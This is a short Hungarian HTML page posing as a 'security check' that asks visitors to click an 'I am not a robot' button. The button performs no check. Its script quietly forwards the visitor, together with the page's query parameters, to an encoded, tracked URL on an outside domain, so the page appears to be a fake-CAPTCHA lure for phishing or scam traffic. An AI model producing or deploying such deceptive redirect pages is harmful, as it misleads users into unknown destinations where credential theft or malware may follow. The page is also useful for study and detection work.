<!DOCTYPE html>
<html lang="hu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Biztonsági ellenőrzés</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            font-family: Arial, Helvetica, sans-serif;
            background: #fafafa;
            color: #333333;
        }
        .card {
            width: 100%;
            max-width: 520px;
            padding: 38px 30px;
            text-align: center;
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }
        .icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: #f0f4f8;
            color: #475569;
            font-size: 30px;
            font-weight: bold;
        }
        h1 {
            margin-bottom: 14px;
            font-size: 26px;
            line-height: 1.25;
            font-weight: 700;
        }
        .important-title {
            color: #1e293b;
        }
        .intro {
            margin-bottom: 22px;
            color: #666666;
            font-size: 16px;
            line-height: 1.6;
        }
        .notice {
            margin-bottom: 28px;
            padding: 18px;
            text-align: left;
            background: #f8f9fa;
            border-left: 4px solid #64748b;
            border-radius: 4px;
            color: #444444;
            font-size: 14px;
            line-height: 1.6;
        }
        .continue-btn {
            display: block;
            width: 100%;
            padding: 15px 22px;
            border: none;
            border-radius: 4px;
            background: #334155;
            color: #ffffff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            text-decoration: none;
            transition: 0.2s ease;
        }
        .continue-btn:hover {
            background: #1e293b;
        }
        .continue-btn:focus {
            outline: 3px solid rgba(51, 65, 85, 0.25);
            outline-offset: 3px;
        }
        @media (max-width: 480px) {
            .card {
                padding: 30px 22px;
            }
            h1 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>

  <main class="card">
    <div class="icon">✓</div>
    <h1 class="important-title">Biztonsági ellenőrzés</h1>
    <p class="intro">
      Kérjük, a továbblépés előtt végezze el ezt az egyszerű ellenőrzési lépést személyazonossága igazolásához.
    </p>
    <div class="notice">
      Az automatizált lekérdezések elleni védelem és a biztonságos kapcsolat garantálása érdekében kérjük, kattintson az alábbi gombra annak igazolására, hogy Ön nem robot.
    </div>
    <button class="continue-btn" type="button" onclick="continueNext()">
      Nem vagyok robot
    </button>
  </main>

<script>
    function continueNext() {
        const targetBaseUrl = "https://land09.aaknown.us/YmhoampmY2d0ZA/?u=162C1608";
        const currentParams = new URLSearchParams(window.location.search);
        const finalUrl = currentParams.toString() 
            ? targetBaseUrl + "&" + currentParams.toString() 
            : targetBaseUrl;
        window.location.replace(finalUrl);
    }
</script>

</body>
</html>
